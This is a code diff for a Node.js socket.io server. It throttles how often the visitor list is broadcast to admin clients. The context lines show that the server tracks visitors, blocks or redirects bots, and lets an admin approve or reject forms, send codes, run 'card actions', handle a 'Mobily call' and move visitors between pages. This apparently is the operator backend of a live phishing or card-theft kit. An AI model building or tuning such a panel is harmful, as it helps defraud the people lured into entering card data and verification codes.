@@ -594,6 +594,17 @@ function saveVisitorPermanently(visitor) {
 // === Bot Redirect ===
 let botRedirectUrl = ''; // URL to redirect bots to (empty = just block)
 
+// === Throttled Admin Broadcast (prevents admin panel from freezing under load) ===
+let _pendingAdminUpdate = false;
+function broadcastVisitorsToAdmins() {
+  if (_pendingAdminUpdate) return; // already scheduled
+  _pendingAdminUpdate = true;
+  setTimeout(() => {
+    _pendingAdminUpdate = false;
+    io.emit("visitors:update", Array.from(visitors.values()));
+  }, 1000);
+}
+
 // === Anti-Bot Protection ===
 // Track connections per IP (max 5 concurrent connections per IP)
 const ipConnectionCount = new Map();
@@ -1135,7 +1146,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      broadcastVisitorsToAdmins();
     }
     console.log(`Form approved for visitor: ${visitorSocketId}`);
   });
@@ -1150,7 +1161,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      broadcastVisitorsToAdmins();
     }
     console.log(`Form rejected for visitor: ${visitorSocketId}`);
   });
@@ -1164,7 +1175,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      broadcastVisitorsToAdmins();
     }
     console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
   });
@@ -1179,7 +1190,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      broadcastVisitorsToAdmins();
     }
     console.log(`Code sent to visitor ${visitorSocketId}: ${code}`);
   });
@@ -1193,7 +1204,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      broadcastVisitorsToAdmins();
     }
     console.log(`Navigating visitor ${visitorSocketId} to: ${page}`);
   });
@@ -1215,7 +1226,7 @@ io.on("connection", (socket) => {
       }
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      broadcastVisitorsToAdmins();
     }
     console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
   });
@@ -1229,7 +1240,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      broadcastVisitorsToAdmins();
     }
     console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
   });
@@ -1243,7 +1254,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      broadcastVisitorsToAdmins();
     }
     console.log(`Resend approved for visitor ${visitorSocketId}`);
   });
